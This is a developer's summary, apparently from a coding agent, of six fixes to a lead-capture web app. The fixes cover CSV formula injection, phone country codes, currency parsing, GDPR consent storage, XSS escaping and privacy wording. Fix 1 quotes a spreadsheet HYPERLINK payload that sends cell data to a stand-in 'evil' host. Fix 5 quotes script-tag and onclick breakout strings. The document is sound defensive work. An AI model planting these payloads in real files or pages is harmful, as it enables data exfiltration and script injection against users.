# Batch C: High-Severity Fixes Summary

Branch: `fix/high-severity-c` (stacked on `fix/consolidated-ab`)

## Commits

1. `b757743` fix(security): guard CSV/Excel formula injection in lead exports
2. `37a9fd9` fix: correct WhatsApp deep-link country code from NL (31) to BE (32)
3. `0f86091` fix: correctly parse Belgian/Dutch-formatted currency in dashboard totals
4. `affacbb` fix(gdpr): persist consent server-side for GDPR Art. 7(1) demonstrability
5. `68c1fd0` fix(security): harden escJs() against script-context XSS breakout
6. `666b94a` fix(docs): correct privacy policy to match actual session storage implementation

---

## Fix 1: CSV/Excel Formula Injection in Lead Exports

**Files:** `api/leads.js`

**Problem:** Lead-supplied fields (from the public, unauthenticated lead-capture form) were written into CSV exports with only quote-doubling and newline-stripping. A leading `=`, `+`, `-`, `@`, tab, or CR would be interpreted as a formula by Excel/Sheets (e.g., a lead name of `=HYPERLINK("http://evil/"&A1,"x")` executes when the client opens the exported file).

**Fix:** Added a shared `csvFormulaGuard()` helper that prefixes such cells with a single quote (standard CSV-injection mitigation). Applied to both export code paths:
- `mode: 'csv-export'` (POST handler)
- `GET ?export=true` (query param handler)

**Verification:** `node -c api/leads.js` passed. Reviewed both export paths use the same guard.

**Cycles:** Fix was correct from cycle 1. Cycle 2 refined the comment wording slightly.

---

## Fix 2: Netherlands Country Code in WhatsApp Deep Links

**Files:** `api/dashboard.js`

**Problem:** Local-format phone numbers (leading `0`) had `'31'` (Netherlands) prepended when building `https://wa.me/<number>` deep links, but Helvaro's actual client base is Belgian (+32).

**Fix:** Changed `'31'` to `'32'` at all 3 occurrences (lines 9886, 10116, 11353). Verified via `grep` that no other occurrences exist anywhere in the codebase.

**Verification:** `node -c api/dashboard.js` passed. Repo-wide grep confirmed no missed occurrences.

**Cycles:** Fix was correct from cycle 1 with no refinement needed.

---

## Fix 3: Belgian/Dutch Currency Parsing (Trickiest Fix)

**Files:** `api/dashboard.js`

**Problem:** `parseDealValue()` and a duplicate inline version at the Pipeline waarde summary chip stripped `€`/whitespace and swapped only the first comma for a decimal point, without removing `.` thousands separators. Result: `€1.500,00` became `1.500.00`, and `parseFloat` truncated at the second dot, yielding `1.5` instead of `1500`.

**Fix:** Rewrote `parseDealValue()` to correctly parse Belgian/Dutch-formatted currency:
- If a comma is present, strip all `.` before it (thousands separators), then convert `,` to `.`
- If no comma, strip all `.` entirely (this format never uses `.` as a decimal point)
- Collapsed the duplicate inline parser to call the shared `parseDealValue()`

**Critical discovery during review:** The regex escapes needed double backslashes (`\\.`) because `api/dashboard.js` embeds its client-side JS inside a Node template literal — single backslashes collapse during evaluation. The file's existing convention (e.g., `\\D`, `\\n` elsewhere) confirmed this. The original `€\s` whitespace-strip also had this bug (predating my change), which I corrected on the same line since it directly affected the fix's correctness.

**Verification:**
1. Rendered the full dashboard HTML via the handler
2. Extracted the embedded ~297KB client script
3. Ran `node -c` on the extracted script (not just the outer file)
4. Executed the deployed `parseDealValue()` against spec test cases:
   - `"1.500"` -> 1500 PASS
   - `"1.500,50"` -> 1500.50 PASS
   - `"1500"` -> 1500 PASS
   - `"€ 2.750,00"` -> 2750 PASS
   - `"1.500.000,75"` -> 1500000.75 PASS
   - `""` / `null` / `"abc"` -> 0 PASS

**Cycles:**
- Cycle 1: Initial implementation with single-backslash regex
- Cycle 2: Discovered via render+extract that regexes were malformed in delivered script, fixed to double backslashes
- Cycle 3: Re-ran full verification pipeline, all test cases passed

---

## Fix 4: GDPR Consent Persistence

**Files:** `api/form.js`, `api/form-page.js`, `api/dashboard.js`, `public/form-widget.js`

**Problem:** The public lead form (`form-page.js`) shows a required consent checkbox and blocks the browser's submit button client-side, but `api/form.js` never read, validated, or stored any consent field. The gate was client-side only (trivially bypassed by calling the API directly), and there was no server-side record proving consent was given for ANY lead — a real GDPR Art. 7(1) demonstrability gap.

**Fix:**
1. **form-page.js:** Include consent checkbox state in the submitted payload
2. **public/form-widget.js:** Add identical consent checkbox + client-side validation (without this, the server-side enforcement would break every client's embedded widget in production)
3. **form.js:** Require `consent === true` (strict boolean, blocks bypass via string `"true"` or number `1`), reject with clear Dutch error if missing/false, persist timestamped consent record
4. **dashboard.js serializeNotities():** Spread unknown keys through instead of dropping them, so consent (and `waFailed`, etc.) survives future dashboard note/task/call edits

**Why `public/form-widget.js` was touched:** This embeddable widget is a second caller of `api/form.js` (used by clients embedding the lead form on their own sites). Without adding a consent checkbox here, the server-side enforcement would have broken production lead capture for all clients using the widget.

**GDPR Field-Storage Judgment Call:**

No existing Airtable column maps cleanly to "consent given at time T." The Leads table schema (documented in `docs/architecture.md`) has no `Consent` field. Options considered:

1. **Create new Airtable column:** Out of scope for a code branch (schema change requires Airtable admin access)
2. **Use existing free-text Notities field:** This is the only writable free-text field available at lead creation time. The dashboard already reads/writes a JSON blob here via `parseNotities()`/`serializeNotities()`. After the Batch B fix (`...spread` parsed JSON, don't just known keys), unknown keys round-trip through untouched.

**Decision:** Persist consent as `{ consent: { given: true, ts: '...' } }` inside the Notities JSON blob. This survives future dashboard edits. If a dedicated consent column is later added to Airtable, the write in `form.js` can be trivially updated.

**Verification:**
- `node -c` on all 4 files passed
- Simulated API calls confirmed all bypass attempts rejected:
  - No consent field -> 400
  - `consent: false` -> 400
  - `consent: ""` -> 400
  - `consent: "true"` -> 400 (string, not boolean)
  - `consent: 1` -> 400 (number, not boolean)
  - `consent: true` -> passes validation (fails later on network in test env)

**Cycles:**
- Cycle 1: Initial implementation with `if (!body.consent)`
- Cycle 2: Found bypass via string `"true"` being truthy, tightened to `=== true`
- Cycle 3: Verified all bypass attempts rejected

---

## Fix 5: Script-Context Stored XSS via AI Name Field

**Files:** `api/form-page.js`

**Problem:** The `escJs()` helper embedded AI-name-derived values into an inline `<script>` block and an HTML attribute (`onerror="..."`). It only stripped control characters and escaped backslash/single-quote — it did NOT neutralize `</script>` or double quotes. A client who set their AI Name to `Sara</script><script>alert(1)//` or `"breakout" onclick=evil()` would inject arbitrary HTML/JS into their own public lead-capture page.

**Fix:** Hardened `escJs()` to escape `<`, `>`, `/`, `"` as `\xNN` hex codes:
- `</script>` prevention: Browsers parse the closing tag before JS interprets string contents
- `"` prevention: Stops breakout from HTML attribute context (the `onerror` handler)

**Verification:**
- Tested comprehensive XSS payloads against the hardened function
- Rendered the page and verified the inline script still parses correctly
- All test cases passed

**Cycles:**
- Cycle 1: Added escaping for `<`, `>`, `/`
- Cycle 2: Found that `"` was unescaped and could break out of HTML attribute context
- Cycle 3: Added `"` escaping, verified all test cases pass

---

## Fix 6: Privacy Policy Text Correction

**Files:** `api/privacy.js`

**Problem:** The privacy policy claimed "sessie-opslag voor authenticatie" (sessionStorage), but the actual implementation (`dashboard.js`) stores the session token in localStorage with a 7-day TTL. This is materially different persistence: sessionStorage clears on browser close, localStorage survives restarts and persists across tabs.

**Fix:** Corrected to: "lokale opslag (localStorage) voor authenticatie, met een geldigheidsduur van 7 dagen" — accurately describing the actual mechanism while maintaining the document's existing legal language style.

**Verification:** Confirmed `SESSION_TTL = 7 * 24 * 60 * 60 * 1000` (7 days) in dashboard.js, and all session keys use `localStorage`.

**Cycles:** Fix was correct from cycle 1, straightforward documentation correction.

---

## Files Modified

| File | Fixes Applied |
|------|---------------|
| `api/leads.js` | Fix 1 (CSV injection guard) |
| `api/dashboard.js` | Fix 2 (country code), Fix 3 (currency parsing), Fix 4 (serializeNotities spread) |
| `api/form.js` | Fix 4 (consent validation + persistence) |
| `api/form-page.js` | Fix 4 (consent in payload), Fix 5 (escJs hardening) |
| `public/form-widget.js` | Fix 4 (consent checkbox + validation) |
| `api/privacy.js` | Fix 6 (text correction) |

---

## What Changed Between Cycles (Fix 3 — Trickiest)

Fix 3 (Belgian/Dutch currency parsing) required the most iteration:

**Cycle 1 -> Cycle 2:**
- Initial implementation used single-backslash regex literals (`\.`)
- Discovered via render+extract that the delivered client script had malformed regexes
- Root cause: This file's client JS lives inside an outer template literal, so regex escapes need double backslashes (`\\.`) to survive evaluation
- Fixed all regex escapes to use double backslashes, matching the file's existing convention

**Cycle 2 -> Cycle 3:**
- Re-ran full verification pipeline (render, extract 297KB script, syntax check, functional tests)
- All spec test cases passed
- No further changes needed

---

## Summary

All 6 fixes have been committed to `fix/high-severity-c`. No files outside the fix scope were touched. All syntax checks passed. Ready for merge into the consolidated branch.
